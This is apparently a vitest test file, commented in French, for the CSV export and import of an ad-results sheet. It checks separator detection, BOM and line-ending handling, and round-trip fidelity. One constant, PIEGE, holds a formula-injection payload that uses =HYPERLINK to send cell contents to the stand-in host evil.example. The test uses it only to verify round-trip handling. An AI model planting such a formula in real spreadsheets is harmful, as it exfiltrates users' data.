import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import { toCsv, sheetNumber, SHEET_COLUMNS, COMPUTED_COLUMNS, COL_HYPOTHESIS } from '../src/adsmap/sheet';
import { parseCsv, buildImportPlan, detecterSeparateur, type SeparateurCsv } from '../src/adsmap/import-sheet';

/**
 * L'export Résultats se réimporte tel quel.
 *
 * L'export sort au POINT-VIRGULE (Excel en français) mais l'import ne lisait que
 * la VIRGULE · un export repris tel quel tombait dans une seule cellule par
 * ligne, et toutes les colonnes se rabattaient sur elle (le « concept » importé
 * valait la ligne entière). On lit ici ce que l'import REND,
 * cellule par cellule, sur l'export réel du noyau et sur le modèle TrueFords.
 */

const PIEGE = '=HYPERLINK("https://evil.example/?d="&A2&B2;"Voir la preuve")';
const TRUEFORDS = readFileSync(join(__dirname, 'fixtures/sheet-truefords.csv'), 'utf8');
const AUJOURD_HUI = new Date('2026-08-27');

/**
 * Lecture BRUTE (RFC 4180, apostrophes gardées) · ce que le tableur a en main
 * avant de réenregistrer. Volontairement indépendante de `parseCsv`.
 */
function lireBrut(texte: string, sep: string): string[][] {
  const t = texte.replace(/^﻿/, '');
  const rows: string[][] = [];
  let row: string[] = [], cur = '', q = false;
  for (let k = 0; k < t.length; k++) {
    const c = t[k]!;
    if (q) { if (c === '"') { if (t[k + 1] === '"') { cur += '"'; k++; } else q = false; } else cur += c; continue; }
    if (c === '"') q = true;
    else if (c === sep) { row.push(cur); cur = ''; }
    else if (c === '\n') { row.push(cur); rows.push(row); row = []; cur = ''; }
    else if (c !== '\r') cur += c;
  }
  if (cur || row.length) { row.push(cur); rows.push(row); }
  return rows;
}

/** Réenregistrement par un tableur · entoure ce qui doit l'être, fin de ligne et BOM au choix. */
function reenregistrer(rows: string[][], sep: string, o: { bom?: boolean; eol?: string } = {}): string {
  const champ = (v: string) => (v.includes(sep) || /["\r\n]/.test(v) ? `"${v.split('"').join('"' + '"')}"` : v);
  return (o.bom ? '﻿' : '') + rows.map((r) => r.map(champ).join(sep)).join(o.eol ?? '\r\n') + (o.eol ?? '\r\n');
}

describe('detecterSeparateur · mesuré sur les en-têtes réels', () => {
  it.each([
    ['export Résultats, 29 colonnes', toCsv([], { withComputed: true }), ';'],
    ['export Résultats, 19 colonnes', toCsv([], {}), ';'],
    ['modèle TrueFords (ligne des blocs, puis en-tête)', TRUEFORDS, ','],
    ['modèle TrueFords réenregistré en tabulations', reenregistrer(lireBrut(TRUEFORDS, ','), '\t'), '\t'],
  ] as const)('%s → %j', (_nom, texte, attendu) => {
    expect(detecterSeparateur(texte), `séparateur mal détecté sur ${_nom}`).toEqual({ separateur: attendu, raison: 'seul-present' });
  });

  it('un séparateur entre guillemets ne compte pas', () => {
    expect(detecterSeparateur('"a;b;c","d;e;f",g\n').separateur, 'le « ; » entre guillemets a été compté').toBe(',');
    expect(parseCsv('"a;b;c","d;e;f",g\n')).toEqual([['a;b;c', 'd;e;f', 'g']]);
    expect(detecterSeparateur('"Statut, ad";"Concept, titre"\r\n').separateur).toBe(';');
    // Un saut de ligne entre guillemets ne coupe pas l'en-tête.
    expect(parseCsv('"Statut\nde l’ad";"Concept, titre"\r\nPrête;A\r\n')).toEqual([['Statut\nde l’ad', 'Concept, titre'], ['Prête', 'A']]);
  });

  it('une ligne de titre sans séparateur est sautée · la référence est la première ligne qui en porte', () => {
    expect(detecterSeparateur('Export du 01/10/2026\r\nStatus;Ad Concept\r\nPrête;A\r\n').separateur, 'la ligne de titre a servi de référence').toBe(';');
  });
});

describe('detecterSeparateur · les cas ambigus, tranchés et écrits', () => {
  it('aucun séparateur sur 20 lignes · virgule, comme l’import l’a toujours lu', () => {
    expect(detecterSeparateur('Status\nvaleur\n'), 'sans séparateur, l’import ne lit plus à la virgule comme avant').toEqual({ separateur: ',', raison: 'defaut-aucun' });
    // Au-delà de la fenêtre, un « ; » ne fait plus de la ligne une référence.
    expect(detecterSeparateur(`${'titre\n'.repeat(20)}a;b\n`), 'la référence a été cherchée au-delà des 20 lignes de l’en-tête').toEqual({ separateur: ',', raison: 'defaut-aucun' });
    expect(detecterSeparateur(`${'titre\n'.repeat(19)}a;b\n`).separateur, 'une ligne sans séparateur a servi de référence').toBe(';');
    expect(detecterSeparateur('')).toEqual({ separateur: ',', raison: 'defaut-aucun' });
  });

  it('plusieurs séparateurs · celui qui découpe les lignes suivantes comme l’en-tête l’emporte, pas le plus fréquent', () => {
    // 3 virgules contre 2 points-virgules dans l'en-tête, mais seul « ; » donne 3 colonnes partout.
    const t = 'Prix, TTC;Prix, HT;Marge, nette\r\n12,5;10;2,5\r\n8;6,5;1,5\r\n';
    expect(detecterSeparateur(t), 'la majorité de l’en-tête a primé sur la cohérence des lignes').toEqual({ separateur: ';', raison: 'coherence' });
    expect(parseCsv(t)).toEqual([['Prix, TTC', 'Prix, HT', 'Marge, nette'], ['12,5', '10', '2,5'], ['8', '6,5', '1,5']]);
  });

  it('cohérence à égalité (en-tête seul) · le plus fréquent dans l’en-tête', () => {
    expect(detecterSeparateur('a,b,c;d\n'), 'en-tête seul · le plus fréquent n’a pas été retenu').toEqual({ separateur: ',', raison: 'majorite' });
    expect(detecterSeparateur('a;b;c,d\n')).toEqual({ separateur: ';', raison: 'majorite' });
  });

  it('égalité parfaite · virgule d’abord, sinon point-virgule, puis tabulation', () => {
    expect(detecterSeparateur('a,b;c\n'), 'égalité tranchée hors de l’ordre écrit (virgule d’abord)').toEqual({ separateur: ',', raison: 'defaut-egalite' });
    expect(detecterSeparateur('a;b\tc\n')).toEqual({ separateur: ';', raison: 'defaut-egalite' });
  });

  it('un en-tête ambigu est signalé dans le rapport d’import · un en-tête net ne l’est pas', () => {
    const ambigu = buildImportPlan('Status;Ad Concept,Date de lancement\nPrête;A,01/08/2026\n', { today: AUJOURD_HUI });
    expect(ambigu.report.warnings.some((w) => w.includes('Séparateur de colonnes ambigu') && w.includes('à la virgule')),
      'le choix du séparateur ambigu n’est pas dit').toBe(true);
    for (const t of [TRUEFORDS, toCsv([], { withComputed: true })]) {
      expect(buildImportPlan(t, { today: AUJOURD_HUI }).report.warnings.join(' ')).not.toContain('Séparateur de colonnes ambigu');
    }
  });
});

describe('BOM et fins de ligne', () => {
  it('le BOM d’Excel ne colle pas au premier intitulé, même devant un guillemet', () => {
    expect(parseCsv('﻿Status;Ad Concept\r\nPrête;A\r\n')[0]![0], 'le BOM est resté dans « Status »').toBe('Status');
    expect(parseCsv('﻿"Status";"Ad Concept"\r\n"Prête";"A"\r\n')).toEqual([['Status', 'Ad Concept'], ['Prête', 'A']]);
  });

  it('\\r\\n ne laisse aucun \\r dans la dernière cellule', () => {
    const rows = parseCsv('Status;Achats\r\nPrête;3\r\n');
    expect(rows, 'un « \\r » est resté en fin de ligne').toEqual([['Status', 'Achats'], ['Prête', '3']]);
  });
});

describe('aller-retour · l’export du noyau, relu par l’import', () => {
  const ligne = {
    Status: 'Terminé', 'BATCH #': 4, 'Ad Concept': 'Avant; après', '📎 Désire': '+Confiance', '📎 Angle(s)': 'Preuve',
    [COL_HYPOTHESIS]: 'Prix, puis preuve', 'Ad Format': 'Statique', 'Ad Type': 'Idéation',
    Apprentissages: PIEGE, Learnings: 'ligne 1\nligne 2', 'Date de lancement': '01/08/2026', Plateforme: 'Meta',
    CPA: sheetNumber(-12.5), Dépense: sheetNumber(1234.5), Achats: 3,
  };
  const attendu = [...SHEET_COLUMNS, ...COMPUTED_COLUMNS].map((c) => String((ligne as Record<string, unknown>)[c] ?? ''));
  const exporte = toCsv([ligne], { withComputed: true });   // `;`, BOM, CRLF · ce que télécharge l'utilisateur

  const formes: Array<[string, string]> = [
    ['tel quel (point-virgule, BOM, CRLF)', exporte],
    ['réenregistré à la virgule (Sheets · sans BOM)', reenregistrer(lireBrut(exporte, ';'), ',')],
    ['réenregistré à la virgule avec BOM (Excel « CSV UTF-8 »)', reenregistrer(lireBrut(exporte, ';'), ',', { bom: true })],
    ['réenregistré en tabulations, fins de ligne LF', reenregistrer(lireBrut(exporte, ';'), '\t', { eol: '\n' })],
  ];

  it.each(formes)('%s · chaque colonne redonne la valeur saisie', (_nom, texte) => {
    const rows = parseCsv(texte);
    expect(rows[0], 'l’en-tête relu n’est pas celui de l’export').toEqual([...SHEET_COLUMNS, ...COMPUTED_COLUMNS]);
    expect(rows[1], 'une valeur a changé à l’aller-retour').toEqual(attendu);
    expect(rows).toHaveLength(2);
  });

  it.each(formes)('%s · buildImportPlan rend le même plan', (_nom, texte) => {
    const plan = buildImportPlan(texte, { today: AUJOURD_HUI });
    expect(plan.report.rowsRead).toBe(1);
    expect(plan.ads[0]).toMatchObject({ learning: PIEGE, hypothesis: 'Prix, puis preuve', batchNumber: 4, status: 'done', launchedAt: '2026-08-01' });
    expect(plan.concepts.map((c) => [c.title, c.angleLabel])).toEqual([['Avant; après', 'Preuve']]);
    expect(plan.desires.map((d) => d.label)).toEqual(['+Confiance']);
    expect(plan).toEqual(buildImportPlan(exporte, { today: AUJOURD_HUI }));
  });
});

describe('non-régression · le modèle TrueFords à la virgule', () => {
  const reference = buildImportPlan(TRUEFORDS, { today: AUJOURD_HUI });

  it('se lit comme avant · 18 lignes, 19 colonnes par ligne', () => {
    expect(reference.report.rowsRead).toBe(18);
    const rows = parseCsv(TRUEFORDS);
    expect(new Set(rows.map((r) => r.length))).toEqual(new Set([19]));
    expect(rows, 'la lecture du modèle à la virgule a changé').toEqual(parseCsv(TRUEFORDS, ','));
  });

  it.each([[';', true, '\r\n'], ['\t', false, '\n'], [',', true, '\r\n']] as Array<[SeparateurCsv, boolean, string]>)(
    'réenregistré avec %j (BOM %s) · le même plan, au caractère près',
    (sep, bom, eol) => {
      const texte = reenregistrer(lireBrut(TRUEFORDS, ','), sep, { bom, eol });
      expect(buildImportPlan(texte, { today: AUJOURD_HUI }), `le modèle réenregistré avec ${JSON.stringify(sep)} ne redonne pas le même plan`).toEqual(reference);
    },
  );
});
